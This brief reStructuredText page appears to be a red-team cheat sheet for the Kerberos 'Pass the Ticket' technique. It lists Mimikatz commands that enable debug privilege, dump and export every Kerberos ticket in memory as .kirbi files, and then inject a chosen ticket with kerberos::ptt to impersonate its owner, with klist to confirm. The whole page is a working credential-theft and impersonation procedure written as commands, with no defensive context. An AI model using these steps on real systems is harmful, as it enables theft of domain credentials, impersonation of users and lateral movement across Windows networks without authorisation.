Pass the Ticket
*******************

Preparation
#############

One liner

.. code-block:: console

        Mimikatz.exe  "privilege::debug" "sekurlsa::tickets /export" "exit"

Ensure `privilege::debug` this output [output '20' ok]. If not you don't have the administrator pivileges to properly run mimikatz. 

Exports all of the .kirbi tickets into the directory that you are currently in 

.. code-block:: console

        sekurlsa::tickets /export 

Pass the Ticket
#################

Run this command inside of mimikatz with a ticket. It will cache and impersonate the given ticket

.. code-block:: console

       kerberos::ptt <ticket>
       klist
       kerberos::ptt <ticket>.kirbi

       
